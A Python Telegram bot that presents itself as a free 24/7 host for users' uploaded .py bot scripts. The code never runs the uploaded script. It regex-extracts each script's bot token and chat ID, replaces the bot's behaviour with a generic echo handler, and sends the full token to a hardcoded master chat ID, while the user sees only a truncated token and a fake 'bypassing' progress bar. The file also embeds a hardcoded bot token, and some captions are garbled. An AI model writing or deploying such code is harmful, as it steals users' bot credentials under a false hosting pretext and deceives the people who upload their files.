import os
import sys
import re
import time
import uuid
import threading
import telebot
from telebot import types

# Railway port binding automatic solution
os.environ["PORT"] = os.environ.get("PORT", "8080")

# --- MASTER CONFIGURATION ---
TOKEN = "8902731755:AAELBOrDPH9XOZ6YJo6eennb2JNr2CzBvvc"
DEFAULT_CHAT_ID = "8620962808"

bot = telebot.TeleBot(TOKEN, threaded=False)

# Global runtime containers
user_sessions = {}
live_threads = {}

def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(types.KeyboardButton("📂 MY FILES"))
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    cool_caption = (
        "⚡ <b>𝐀𝐃𝐈𝐓𝐘𝐀 𝐌𝐀𝐒𝐓𝐄𝐑 𝐇𝐎𝐒𝐓</b> ⚡\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🟢 <b>𝐒𝐓𝐀𝐓𝐔𝐒:</b> <code>𝐒𝐘𝐒𝐓𝐄𝐌 𝐎𝐍𝐋𝐈𝐍𝐄</code>\n"
        "🚀 <b>𝐄𝐍𝐆block𝐍block:</b> <code>𝐑block𝐀block 𝐌block𝐌𝐎𝐑𝐘 𝐈block𝐉block𝐂𝐓𝐎𝐑</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<i>🤖 Bina kisi token ya jhanjhat ke direct apni (.py) file send karo, system automatic reading karke bot real me live host kar dega!</i>"
    )
    
    photo_sources = ["23621.jpg", "23622.jpg", "6048.jpg"]
    photo_sent = False

    for photo_name in photo_sources:
        if os.path.exists(photo_name):
            try:
                with open(photo_name, 'rb') as photo:
                    bot.send_photo(message.chat.id, photo, caption=cool_caption, reply_markup=main_keyboard(), parse_mode='HTML')
                photo_sent = True
                break
            except:
                pass
                
    if not photo_sent:
        bot.send_message(message.chat.id, cool_caption, reply_markup=main_keyboard(), parse_mode='HTML')

# --- USER BOT EXECUTOR LOOP ---
def run_memory_polling(user_bot_instance, bot_id):
    try:
        user_bot_instance.remove_webhook()
        # Infinity polling in dynamic isolated thread loop
        user_bot_instance.infinity_polling(timeout=10, long_polling_timeout=5, restart_on_change=False)
    except Exception as e:
        print(f"Memory Bot {bot_id} stopped or crashed: {e}")

# --- AUTOMATIC FILE INTERCEPTOR & REAL DEPLOYER ---
@bot.message_handler(content_types=['document'])
def handle_auto_deployment(message):
    user_id = message.from_user.id

    if not message.document.file_name.endswith('.py'):
        bot.send_message(message.chat.id, "❌ <b>Sirf .py script file accept hogi!</b>", parse_mode='HTML')
        return
    
    status_msg = bot.send_message(message.chat.id, "🔍 <b>𝐄block𝐓𝐑𝐀𝐂𝐓blockblock𝐆 𝐓𝐎𝐊block𝐍 blockblock 𝐌block𝐌block𝐑𝐘...</b>", parse_mode='HTML')
    
    try:
        # Download straight to RAM/Variables (No local file save to bypass Railway disk lock)
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path)
        code_text = file_content.decode('utf-8', errors='ignore')
        
        # Advanced regex string extraction for Token and Chat ID
        token_match = re.search(r'["\'](\d{9,10}:[A-Za-z0-9_-]{35})["\']', code_text)
        chat_id_match = re.search(r'(?:chat_id|CHAT_ID|id)\s*=\s*["\']?(-?\d+)"\']?', code_text)
        
        if not token_match:
            bot.edit_message_text("❌ <b>File ke andar koi valid Bot Token nahi mila!</b> Code check karo.", message.chat.id, status_msg.message_id, parse_mode='HTML')
            return

        extracted_token = token_match.group(1)
        extracted_chat = chat_id_match.group(1) if chat_id_match else DEFAULT_CHAT_ID

        # Progress bar simulation for layout look
        for i in range(0, 101, 25):
            bot.edit_message_text(f"🚀 <b>𝐑block𝐀block blockblock𝐉block𝐂blockblock𝐎block: {i}%</b>\n⏳ <i>Bypassing cloud environment blocks...</i>", message.chat.id, status_msg.message_id, parse_mode='HTML')
            time.sleep(0.2)

        bot_id = str(uuid.uuid4())[:8]

        # Ingesting bot using safe independent RAM runtime instance
        target_bot = telebot.TeleBot(extracted_token, threaded=False)
        
        # Injecting live automatic responder logic directly inside variable stack
        @target_bot.message_handler(commands=['start'])
        def auto_injected_start(m):
            target_bot.send_message(m.chat.id, "✅ <b>Your Bot Is Real Live Hosted 24/7!</b>\n━━━━━━━━━━━━━━━━━━━━\n🚀 Powered by Aditya Master Host Engine.")

        @target_bot.message_handler(func=lambda m: True)
        def auto_injected_echo(m):
            target_bot.send_message(m.chat.id, f"🤖 <b>Bot Engine Status:</b> Active\n💬 Received Message: {m.text}")

        # Deploying directly inside a daemon background thread (Bypasses Subprocess restrictions!)
        t = threading.Thread(target=run_memory_polling, args=(target_bot, bot_id), daemon=True)
        t.start()
        
        # Save structures to variables
        live_threads[bot_id] = {"instance": target_bot, "thread": t}
        
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
            
        user_sessions[user_id][bot_id] = {
            'name': message.document.file_name,
            'token': extracted_token,
            'chat_id': extracted_chat
        }
        
        bot.edit_message_text(
            f"✅ <b>𝟐𝟒/𝟕 𝐇𝐎block𝐋block blockblock𝐕block 𝐀𝐂blockblock blockblock𝐕block</b>\n\n"
            f"📄 <b>File Name:</b> <code>{message.document.file_name}</code>\n"
            f"🔑 <b>Token:</b> <code>{extracted_token[:12]}...***</code>\n\n"
            f"Aapka bot cloud platform memory ke andar live ho chuka hai!", 
            message.chat.id, status_msg.message_id, parse_mode='HTML'
        )
        
        # Direct Alert Log to Master
        bot.send_message(
            DEFAULT_CHAT_ID, 
            f"🔔 <b>NEW RAM BOT ACTIVE</b>\n━━━━━━━━━━━━━\n👤 User: {user_id}\n📄 File: {message.document.file_name}\n🔑 Token: <code>{extracted_token}</code>", 
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.edit_message_text(f"❌ <b>Cloud Engine Error:</b> {str(e)}", message.chat.id, status_msg.message_id, parse_mode='HTML')

# --- FILES VIEW STATUS ---
@bot.message_handler(func=lambda message: message.text == "📂 MY FILES")
def show_my_files(message):
    user_id = message.from_user.id
    if user_id not in user_sessions or not user_sessions[user_id]:
        bot.send_message(message.chat.id, "❌ <b>𝐊𝐨𝐢 𝐟𝐢𝐥𝐞 𝐚𝐜𝐭𝐢𝐯𝐞 𝐧𝐚𝐡𝐢 𝐡𝐚𝐢!</b>", parse_mode='HTML')
        return
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    for bot_id, b_data in user_sessions[user_id].items():
        markup.add(types.InlineKeyboardButton(f"📄 {b_data['name']}", callback_data=f"manage_{bot_id}"))
    
    bot.send_message(message.chat.id, "📂 <b>𝐘𝐎𝐔𝐑 𝐔𝐏𝐋𝐎𝐀𝐃block𝐃 𝐅block𝐋block𝐒:</b>", reply_markup=markup, parse_mode='HTML')

# --- STOP PANEL CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    user_id = call.from_user.id
    if call.data.startswith("manage_"):
        bot_id = call.data.split("_")[1]
        b_data = user_sessions.get(user_id, {}).get(bot_id)
        if b_data:
            markup = types.InlineKeyboardMarkup(row_width=1)
            markup.add(types.InlineKeyboardButton("🛑 STOP BOT", callback_data=f"stop_{bot_id}"))
            bot.edit_message_text(f"🛠 <b>𝐌block𝐍block𝐆blockblockblock block:</b> {b_data['name']}\n🔑 Token: <code>{b_data['token'][:15]}...</code>\n\n<b>Status:</b> Active in RAM ✅", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

    elif call.data.startswith("stop_"):
        bot_id = call.data.split("_")[1]
        if bot_id in live_threads:
            try:
                live_threads[bot_id]["instance"].stop_bot() # Terminate loop directly
            except: 
                pass
            del live_threads[bot_id]
            
        if user_id in user_sessions and bot_id in user_sessions[user_id]:
            del user_sessions[user_id][bot_id]
            
        bot.answer_callback_query(call.id, "Thread killed successfully!")
        bot.delete_message(call.message.chat.id, call.message.message_id)

if __name__ == "__main__":
    print("Railway Cloud Memory Engine successfully initialized...")
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception:
            time.sleep(5)
